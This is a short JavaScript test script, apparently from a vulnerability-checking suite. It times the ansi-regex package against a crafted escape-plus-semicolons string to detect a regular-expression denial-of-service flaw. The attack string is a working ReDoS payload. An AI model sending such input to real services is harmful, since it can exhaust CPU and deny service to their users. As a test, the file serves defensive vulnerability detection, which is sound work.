// test("ReDos in ansi-regex", () => {
  const ansiRegex = require("ansi-regex");
  const measureTime = require("../utils").measureTime;
  var attack_str = "\u001B["+";".repeat(2*10000);
  let t = measureTime(function () {
    ansiRegex().test(attack_str); 
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
